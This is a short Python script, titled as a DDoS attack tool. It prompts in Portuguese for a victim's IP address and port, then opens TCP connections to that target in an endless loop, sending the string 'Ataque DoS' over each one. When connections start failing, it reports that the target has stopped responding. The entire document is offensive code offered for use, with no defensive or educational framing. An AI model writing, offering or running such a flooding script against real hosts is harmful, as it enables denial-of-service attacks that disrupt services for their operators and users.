#PYTHON SCRIPT FOR DDOS ATTACK
import sys
import socket


ip = input("INFORME O IP DA VÍTIMA: ")
porta = input("INFORME A PORTA: ")
porta = int(porta)


sent = 0
arr  =[]
c = 0
while 1:
    try:
        arr.append(socket.create_connection((ip,porta)))
        arr[c].send("Ataque DoS".encode('utf-8'))
        c+=1
    except socket.error:
        print("[+] O ALVO PAROU DE RESPONDER ") 
